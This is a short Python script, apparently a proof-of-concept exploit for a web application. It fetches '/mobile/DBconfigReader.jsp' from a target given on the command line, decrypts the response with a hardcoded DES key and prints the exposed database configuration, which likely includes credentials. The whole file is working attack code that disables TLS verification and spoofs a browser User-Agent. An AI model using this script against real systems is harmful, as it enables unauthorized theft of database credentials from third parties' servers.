#/usr/bin/python3
import sys
import pyDes
import requests

headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

def decodeDes128bit(secret_key, s):
    try:
        cipherX = pyDes.des('        ')  # 默认就需要8位，所以这里就先用空格来进行填充，后面再用解密密钥来进行填充
        cipherX.setKey(secret_key)
        decodeText = cipherX.decrypt(s)
    except:
        print(sys.exc_info())
        decodeText = ''
    return decodeText


def check(target):
    url = target + "/mobile/DBconfigReader.jsp"
    check_req = requests.get(url, headers = headers, verify=False)
    if check_req.status_code == 200:
        text = check_req.content
        data = decodeDes128bit('1z2x3c4v5b6n', text) 
        if data:
            data = data.strip()
            print("[+]Vuln Exists, db info: ", data)
        else:
            print("[-]Vuln Not Exists!")
    else:
        print("[-]Vuln Not Exists!")
          
if __name__=="__main__":
     check(sys.argv[1])
                      
                      
             
